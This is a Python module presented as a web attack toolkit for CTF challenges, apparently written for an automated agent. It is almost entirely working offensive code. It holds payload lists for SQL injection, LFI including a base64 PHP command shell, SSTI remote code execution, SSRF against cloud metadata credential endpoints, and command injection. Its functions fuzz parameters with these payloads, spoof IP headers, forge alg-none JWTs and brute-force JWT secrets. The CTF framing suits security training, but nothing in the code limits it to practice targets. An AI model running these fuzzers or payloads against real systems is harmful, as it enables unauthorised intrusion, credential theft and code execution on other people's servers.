"""
modules/web.py
--------------
Web attack toolkit for CTF challenges.
Covers: SQLi, LFI, SSTI, SSRF, XSS, path traversal, JWT, header injection, directory fuzzing.
"""

import re
import json
import base64
import urllib.parse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from config import DEFAULT_HEADERS, TIMEOUT_HTTP

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Global session with sensible defaults
SESSION = requests.Session()
SESSION.headers.update(DEFAULT_HEADERS)
SESSION.verify = False


# ──────────────────────────────────────────────────────────────────────────────
# Payload libraries
# ──────────────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    # Auth bypass
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "' OR 'x'='x",
    "1' OR '1'='1",
    # UNION-based (columns 1–5)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Blind time-based
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' AND 1=IF(1=1,SLEEP(3),0)--",
    # Stacked
    "'; SELECT pg_sleep(3)--",
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "/etc/passwd",
    # Encoded
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..%252F..%252Fetc%252Fpasswd",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/convert.base64-encode/resource=../../config.php",
    "php://filter/read=convert.base64-encode/resource=flag.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    # Windows
    "..\\..\\windows\\win.ini",
    "../../windows/win.ini",
    # Proc
    "/proc/self/environ",
    "/proc/self/cmdline",
]

SSTI_PAYLOADS = [
    # Detection
    "{{7*7}}",           # Jinja2, Twig
    "${7*7}",            # FreeMarker, Velocity
    "<%= 7*7 %>",        # ERB
    "#{7*7}",            # Ruby
    "*{7*7}",            # Thymeleaf
    "@(7*7)",            # Razor
    # Jinja2 RCE
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.join(__import__('os').popen('id').read())}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    # Twig RCE
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # FreeMarker
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}",
]

SSRF_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0x7f000001",          # 127.0.0.1 in hex
    "http://2130706433",           # 127.0.0.1 in decimal
    "http://169.254.169.254/latest/meta-data/",   # AWS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",   # Alibaba
    "file:///etc/passwd",
    "file:///etc/hosts",
    "gopher://localhost:3306/",
    "dict://localhost:11211/stat",
]

CMD_INJECTIONS = [
    "; id",
    "| id",
    "& id",
    "&& id",
    "` id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "\n id",
]

PATH_TRAVERSAL = [
    "../",
    "../../",
    "../../../",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "..%252f",
]

INTERESTING_PATHS = [
    "admin", "login", "dashboard", "api", "api/v1", "api/v2",
    "flag", "secret", "backup", "config", "debug", "shell",
    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config",
    ".env", ".env.local", ".env.backup",
    "upload", "uploads", "files", "download", "source", "src",
    "console", "cmd", "phpinfo.php",
    "index.php", "admin.php", "login.php", "config.php",
    "flag.txt", "flag.php", "secret.txt", "password.txt",
    "swagger.json", "openapi.json", "api-docs",
    "actuator", "actuator/env", "actuator/health",
    "wp-admin", "wp-config.php",
    "server-status", "server-info",
]


# ──────────────────────────────────────────────────────────────────────────────
# Core HTTP helpers
# ──────────────────────────────────────────────────────────────────────────────

def _fmt(r: requests.Response, cap: int = 5000) -> dict:
    return {
        "status": r.status_code,
        "body": r.text[:cap],
        "headers": dict(r.headers),
        "url": r.url,
        "length": len(r.text),
    }


def get(url: str, params: dict = None, headers: dict = None,
        cookies: dict = None, allow_redirects: bool = True) -> dict:
    try:
        r = SESSION.get(url, params=params, headers=headers, cookies=cookies,
                        allow_redirects=allow_redirects, timeout=TIMEOUT_HTTP)
        return _fmt(r)
    except Exception as e:
        return {"status": None, "body": "", "headers": {}, "error": str(e)}


def post(url: str, data: dict = None, json_body: dict = None,
         headers: dict = None, cookies: dict = None) -> dict:
    try:
        r = SESSION.post(url, data=data, json=json_body, headers=headers,
                         cookies=cookies, timeout=TIMEOUT_HTTP)
        return _fmt(r)
    except Exception as e:
        return {"status": None, "body": "", "headers": {}, "error": str(e)}


def put(url: str, data: dict = None, json_body: dict = None,
        headers: dict = None) -> dict:
    try:
        r = SESSION.put(url, data=data, json=json_body,
                        headers=headers, timeout=TIMEOUT_HTTP)
        return _fmt(r)
    except Exception as e:
        return {"status": None, "body": "", "headers": {}, "error": str(e)}


def patch_request(url: str, data: dict = None, json_body: dict = None,
                  headers: dict = None) -> dict:
    try:
        r = SESSION.patch(url, data=data, json=json_body,
                          headers=headers, timeout=TIMEOUT_HTTP)
        return _fmt(r)
    except Exception as e:
        return {"status": None, "body": "", "headers": {}, "error": str(e)}


def options_request(url: str) -> dict:
    try:
        r = SESSION.options(url, timeout=TIMEOUT_HTTP)
        return {"status": r.status_code, "allow": r.headers.get("Allow", ""),
                "headers": dict(r.headers)}
    except Exception as e:
        return {"error": str(e)}


# ──────────────────────────────────────────────────────────────────────────────
# Attack modules
# ──────────────────────────────────────────────────────────────────────────────

def sqli_fuzz(url: str, param: str, method: str = "GET",
              extra_data: dict = None) -> list[dict]:
    """Fuzz a parameter with SQL injection payloads."""
    base = extra_data or {}
    results = []
    baseline = get(url, params={**base, param: "1"}) if method == "GET" \
        else post(url, data={**base, param: "1"})
    baseline_len = baseline.get("length", 0)

    for payload in SQLI_PAYLOADS:
        if method == "GET":
            r = get(url, params={**base, param: payload})
        else:
            r = post(url, data={**base, param: payload})
        diff = abs(r.get("length", 0) - baseline_len)
        hit = (
            r.get("status") not in [400, 500] and diff > 50
            or "sql" in r.get("body", "").lower()
            or "syntax" in r.get("body", "").lower()
            or "mysql" in r.get("body", "").lower()
            or "error" in r.get("body", "").lower()
        )
        results.append({
            "payload": payload,
            "status": r.get("status"),
            "length": r.get("length", 0),
            "diff": diff,
            "hit": hit,
            "preview": r.get("body", "")[:200],
        })
    return results


def lfi_fuzz(url: str, param: str) -> list[dict]:
    """Fuzz a parameter with LFI payloads."""
    results = []
    for payload in LFI_PAYLOADS:
        r = get(url, params={param: payload})
        body = r.get("body", "")
        hit = (
            "root:" in body
            or "bin/bash" in body
            or "bin/sh" in body
            or "php" in body.lower()
            or r.get("length", 0) > 500
        )
        # Decode base64 php filter output
        decoded = None
        if "php://filter" in payload and r.get("status") == 200:
            try:
                b64 = re.search(r"[A-Za-z0-9+/]{20,}={0,2}", body)
                if b64:
                    decoded = base64.b64decode(b64.group(0)).decode("utf-8", errors="replace")
                    hit = True
            except Exception:
                pass
        results.append({
            "payload": payload,
            "status": r.get("status"),
            "hit": hit,
            "preview": body[:300],
            "decoded": decoded,
        })
    return results


def ssti_fuzz(url: str, param: str, method: str = "GET",
              extra_data: dict = None) -> list[dict]:
    """Fuzz a parameter with SSTI payloads."""
    base = extra_data or {}
    results = []
    for payload in SSTI_PAYLOADS:
        if method == "GET":
            r = get(url, params={**base, param: payload})
        else:
            r = post(url, data={**base, param: payload})
        body = r.get("body", "")
        hit = "49" in body or "uid=" in body or "root" in body
        results.append({
            "payload": payload,
            "status": r.get("status"),
            "hit": hit,
            "preview": body[:300],
        })
    return results


def ssrf_fuzz(url: str, param: str, method: str = "GET") -> list[dict]:
    """Fuzz a parameter with SSRF payloads."""
    results = []
    for payload in SSRF_PAYLOADS:
        if method == "GET":
            r = get(url, params={param: payload})
        else:
            r = post(url, data={param: payload})
        body = r.get("body", "")
        hit = r.get("status") not in [400, 404, None] and len(body) > 10
        results.append({
            "payload": payload,
            "status": r.get("status"),
            "hit": hit,
            "preview": body[:300],
        })
    return results


def cmd_injection_fuzz(url: str, param: str, method: str = "GET") -> list[dict]:
    """Fuzz a parameter with command injection payloads."""
    results = []
    for payload in CMD_INJECTIONS:
        if method == "GET":
            r = get(url, params={param: "1" + payload})
        else:
            r = post(url, data={param: "1" + payload})
        body = r.get("body", "")
        hit = "uid=" in body or "root" in body or "/bin" in body
        results.append({
            "payload": payload,
            "status": r.get("status"),
            "hit": hit,
            "preview": body[:300],
        })
    return results


def header_injection(url: str, value: str = "127.0.0.1") -> list[dict]:
    """Inject IP spoofing headers to bypass IP restrictions."""
    HEADERS = [
        "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
        "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host",
        "CF-Connecting-IP", "True-Client-IP", "X-Cluster-Client-IP",
        "Forwarded",
    ]
    results = []
    for header in HEADERS:
        r = get(url, headers={header: value})
        results.append({
            "header": header,
            "status": r.get("status"),
            "preview": r.get("body", "")[:200],
        })
    return results


def directory_fuzz(base_url: str, extra_paths: list[str] = None) -> list[dict]:
    """Discover hidden paths/endpoints."""
    paths = INTERESTING_PATHS + (extra_paths or [])
    found = []
    for path in paths:
        url = f"{base_url.rstrip('/')}/{path}"
        r = get(url, allow_redirects=False)
        status = r.get("status")
        if status and status not in [404, 400, 410]:
            found.append({
                "path": path,
                "status": status,
                "length": r.get("length", 0),
                "preview": r.get("body", "")[:200],
            })
    return found


def api_param_fuzz(url: str, known_params: list[str] = None) -> list[dict]:
    """Try common parameter names and observe responses."""
    params = known_params or [
        "id", "user", "username", "admin", "debug", "test",
        "file", "path", "url", "redirect", "next", "return",
        "token", "key", "secret", "password", "passwd",
        "cmd", "command", "exec", "run", "q", "query",
        "page", "limit", "offset", "sort", "order",
    ]
    results = []
    for param in params:
        for value in ["1", "true", "admin", "../etc/passwd", "{{7*7}}"]:
            r = get(url, params={param: value})
            if r.get("status") not in [404, 400, None]:
                results.append({
                    "param": param,
                    "value": value,
                    "status": r.get("status"),
                    "length": r.get("length", 0),
                    "preview": r.get("body", "")[:150],
                })
                break  # move to next param after first non-404
    return results


# ──────────────────────────────────────────────────────────────────────────────
# JWT attacks
# ──────────────────────────────────────────────────────────────────────────────

def decode_jwt(token: str) -> dict:
    """Decode a JWT without verification."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Not a valid JWT (need 3 parts)"}

        def b64decode_part(s: str) -> dict:
            padded = s + "=" * (-len(s) % 4)
            return json.loads(base64.urlsafe_b64decode(padded).decode("utf-8"))

        return {
            "header": b64decode_part(parts[0]),
            "payload": b64decode_part(parts[1]),
            "signature": parts[2],
        }
    except Exception as e:
        return {"error": str(e)}


def forge_jwt_none_alg(token: str, payload_overrides: dict = None) -> str:
    """Forge JWT with 'none' algorithm (bypass signature verification)."""
    try:
        parts = token.split(".")
        header = {"alg": "none", "typ": "JWT"}
        padded = parts[1] + "=" * (-len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(padded).decode())
        if payload_overrides:
            payload.update(payload_overrides)

        def b64enc(d: dict) -> str:
            return base64.urlsafe_b64encode(
                json.dumps(d, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()

        return f"{b64enc(header)}.{b64enc(payload)}."
    except Exception as e:
        return f"Error: {e}"


def crack_jwt_secret(token: str, wordlist: list[str] = None) -> str | None:
    """Brute-force HS256 JWT secret from a wordlist."""
    import hmac
    import hashlib

    default_secrets = [
        "secret", "password", "admin", "key", "jwt", "token",
        "12345", "qwerty", "letmein", "changeme", "test", "dev",
        "supersecret", "mysecretkey", "jwtpassword",
    ]
    wordlist = wordlist or default_secrets

    try:
        parts = token.split(".")
        header_payload = f"{parts[0]}.{parts[1]}".encode()
        padded = parts[2] + "=" * (-len(parts[2]) % 4)
        sig = base64.urlsafe_b64decode(padded)
    except Exception:
        return None

    for secret in wordlist:
        candidate = hmac.new(
            secret.encode(), header_payload, hashlib.sha256
        ).digest()
        if candidate == sig:
            return secret
    return None


# ──────────────────────────────────────────────────────────────────────────────
# Misc web utils
# ──────────────────────────────────────────────────────────────────────────────

def get_cookies(url: str) -> dict:
    try:
        r = SESSION.get(url, timeout=TIMEOUT_HTTP)
        return dict(r.cookies)
    except Exception as e:
        return {"error": str(e)}


def extract_links(html: str, base_url: str = "") -> list[str]:
    """Extract all hrefs from HTML."""
    return re.findall(r'href=["\']([^"\']+)["\']', html)


def extract_forms(html: str) -> list[dict]:
    """Extract form actions and inputs."""
    forms = []
    for form_match in re.finditer(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE):
        form_html = form_match.group(0)
        action = re.search(r'action=["\']([^"\']*)["\']', form_html)
        method = re.search(r'method=["\']([^"\']*)["\']', form_html)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_html)
        forms.append({
            "action": action.group(1) if action else "",
            "method": (method.group(1) if method else "GET").upper(),
            "inputs": inputs,
        })
    return forms


def source_hints(html: str) -> list[str]:
    """Extract clues from HTML comments and data attributes."""
    comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
    data_attrs = re.findall(r'data-\w+=["\']([^"\']+)["\']', html)
    hidden_inputs = re.findall(
        r'<input[^>]+type=["\']hidden["\'][^>]*value=["\']([^"\']+)["\']', html
    )
    return {
        "comments": [c.strip() for c in comments],
        "data_attrs": data_attrs,
        "hidden_inputs": hidden_inputs,
    }


def robots_txt(base_url: str) -> str:
    r = get(f"{base_url.rstrip('/')}/robots.txt")
    return r.get("body", "")


def git_leak_check(base_url: str) -> dict:
    """Check for exposed .git directory."""
    results = {}
    for path in [".git/HEAD", ".git/config", ".git/COMMIT_EDITMSG"]:
        r = get(f"{base_url.rstrip('/')}/{path}")
        if r.get("status") == 200:
            results[path] = r.get("body", "")[:500]
    return results


def graphql_introspect(url: str) -> dict:
    """Run GraphQL introspection query."""
    query = {
        "query": "{ __schema { queryType { name } types { name kind fields { name type { name kind } } } } }"
    }
    return post(url, json_body=query)


def auto_recon(url: str) -> dict:
    """
    Full automatic recon of a web target.
    Returns a structured report the agent uses to plan next steps.
    """
    result = {"url": url, "steps": []}

    # Initial response
    r = get(url)
    result["initial_response"] = {
        "status": r.get("status"),
        "server": r.get("headers", {}).get("Server", ""),
        "x_powered_by": r.get("headers", {}).get("X-Powered-By", ""),
        "content_type": r.get("headers", {}).get("Content-Type", ""),
        "body_preview": r.get("body", "")[:500],
    }
    result["steps"].append("initial_get")

    # Interesting page structure
    body = r.get("body", "")
    result["forms"] = extract_forms(body)
    result["links"] = extract_links(body, url)[:20]
    result["hints"] = source_hints(body)
    result["steps"].append("page_analysis")

    # robots.txt
    result["robots"] = robots_txt(url)
    result["steps"].append("robots_txt")

    # Directory fuzz (subset)
    result["directories"] = directory_fuzz(url, extra_paths=["flag", "secret", "admin"])
    result["steps"].append("directory_fuzz")

    # Git leak
    result["git_leak"] = git_leak_check(url)
    if result["git_leak"]:
        result["steps"].append("git_leak_found")

    # Cookies
    result["cookies"] = get_cookies(url)
    result["steps"].append("cookies")

    return result